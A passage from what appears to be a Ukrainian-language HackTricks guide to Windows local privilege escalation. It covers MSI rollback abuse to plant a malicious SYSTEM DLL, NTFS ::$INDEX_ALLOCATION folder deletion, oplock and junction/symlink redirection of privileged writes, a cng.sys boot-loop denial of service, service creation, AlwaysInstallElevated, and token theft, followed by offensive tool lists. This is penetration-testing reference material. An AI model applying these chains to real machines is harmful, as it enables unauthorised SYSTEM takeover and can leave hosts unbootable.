- Це встановлення використовуватиметься для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Моніторинг `.rbs`
- Використовуйте `ReadDirectoryChangesW` для моніторингу `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
- Отримайте його filename.

- Крок 9: Sync перед rollback
- `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
- Сигналізує подію, коли створено `.rbs`.
- Потім очікує перед продовженням.

- Крок 10: Повторне застосування слабкого ACL
- Після отримання події `.rbs created`:
- Windows Installer **повторно застосовує сильні ACL** до `C:\Config.Msi`.
- Але оскільки у вас усе ще є handle із `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тому ви все ще можете записувати до папки.

- Крок 11: Розміщення підроблених `.rbs` і `.rbf`
- Перезапишіть файл `.rbs` **підробленим rollback script**, який вказує Windows:
- Відновити ваш файл `.rbf` (malicious DLL) у **привілейоване місце** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Розмістіть підроблений `.rbf`, що містить **malicious SYSTEM-level payload DLL**.

- Крок 12: Запуск rollback
- Надішліть сигнал події синхронізації, щоб installer продовжив роботу.
- **Custom action типу 19 (`ErrorOut`)** налаштована на **навмисне завершення встановлення з помилкою** у визначеній точці.
- Це спричиняє **початок rollback**.

- Крок 13: SYSTEM встановлює вашу DLL
- Windows Installer:
- Читає ваш шкідливий `.rbs`.
- Копіює DLL із вашого `.rbf` у цільове місце.
- Тепер у вас є **malicious DLL у шляху, який завантажується SYSTEM**.

- Фінальний крок: Виконання SYSTEM Code
- Запустіть довірений **auto-elevated binary** (наприклад, `osk.exe`), який завантажує hijacked DLL.
- **Boom**: ваш code виконується **як SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна MSI rollback technique (попередня) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша vulnerability дозволяє лише **довільне видалення файлів**?

Ви можете використати **внутрішні механізми NTFS**: кожна папка має прихований alternate data stream під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей stream зберігає **метадані індексу** папки.

Отже, якщо ви **видалите stream `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте API видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що робити, якщо ваш примітив не дає змоги видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Налаштуйте папку та файл-приманку
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустити процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, спрацьовує **oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправити видалення

- Варіант A: Перемістити `file1.txt` в інше місце
- Це спорожнює `folder1`, не порушуючи oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворити `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це націлено на внутрішній stream NTFS, у якому зберігаються metadata folder — його видалення видаляє folder.

5. Крок 5: Вивільнення oplock
- Процес SYSTEM продовжує виконання та намагається видалити `file1.txt`.
- Але тепер через junction + symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється користувачем SYSTEM.

### Створення довільної папки для постійного DoS

Експлуатуйте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з іменем **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає kernel-mode драйверу `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити фактичний драйвер під час запуску.
- Потім Windows намагається завантажити `cng.sys` під час запуску.
- Вона бачить папку, **не може визначити фактичний драйвер** і **аварійно завершує роботу або зупиняє завантаження**.
- **Резервного варіанта немає**, як і **можливості відновлення** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій + симлінків OM до довільного перезапису файлів / boot DoS

Коли **привілейований сервіс** записує журнали/експорти за шляхом, прочитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **симлінків Object Manager + точок монтування NTFS**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, що зберігає цільовий шлях, доступна атакувальнику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування до `\RPC Control` і файловий симлінк OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, що записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити місце призначення привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише log (наприклад, адміністратор запускає «send test SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити змінений шлях до driver → **boot loop DoS**. Це також поширюється на будь-який захищений файл, який привілейований service відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, спочатку може бути здійснена спроба завантажити саме її, що робить цей шлях надійним DoS-приймачем для пошкоджених даних.



## **Від High Integrity до System**

### **Новий service**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити новий service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл достатньо швидко виконує необхідні дії, оскільки через 20 с його буде завершено, якщо це не дійсна служба.

### AlwaysInstallElevated

Із процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою оболонки _**.msi**_.\
[Більше інформації про задіяні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у вже наявному процесі з High Integrity), ви зможете **відкрити майже будь-який процес** (крім захищених процесів) із привілеєм SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай під час використання цієї техніки **вибирають будь-який процес, що працює від імені SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ця техніка використовується meterpreter для підвищення привілеїв у `getsystem`. Техніка полягає у **створенні pipe, а потім створенні або використанні служби для запису в цей pipe**. Після цього **server**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби), отримавши привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Якщо ви хочете переглянути приклад [**переходу від high integrity до System за допомогою name pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконати довільний код із цими дозволами. Тому Dll Hijacking також корисний для такого типу підвищення привілеїв і, крім того, його значно **легше виконати з процесу з high integrity**, оскільки він матиме **дозволи на запис** у папки, що використовуються для завантаження dll.\
**Більше про Dll hijacking можна** [**дізнатися тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Прочитайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка неправильних конфігурацій і конфіденційних файлів (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих неправильних конфігурацій і збір інформації (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка неправильних конфігурацій**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилення зібраних паролів у домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це PowerShell-інструмент для спуфінгу ADIDNS/LLMNR/mDNS і атаки man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ порівняно з Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує host у пошуках неправильних конфігурацій (більше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильної конфігурації (попередньо скомпільований executable на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe з Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цього допису (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає результат роботи **systeminfo** і рекомендує робочі exploits (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає результат роботи **systeminfo** і рекомендує робочі exploits (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Вам потрібно скомпілювати проєкт із використанням правильної версії .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на host-жертві, можна виконати:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — Workshop із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — Атаки на Windows: AT — це новий black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA за допомогою SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + BOF у стеку → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — Полювання на Silver Fox: кішки та миші в тінях kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Уразливість привілейованої файлової системи в SCADA-системі](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти тестування Symbolic Link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Повернення в минуле. Зловживання Symbolic Links у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Прощавай, RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Падіння довіри Node.js: небезпечне визначення модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — завдання контрольного списку C/C++, розв’язані](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: ланцюжок CLDFLT і DirectX Kernel Race Conditions для LPE у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring достатньо, щоб підкорити їх усіх: повноцінний exploit primitive читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші чудові трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код exploit для FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, 1-Day для локального підвищення привілеїв у Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — Kerberos Resource Based Constrained Delegation: коли зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з SSH Agent Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики backdoor (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики backdoor (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
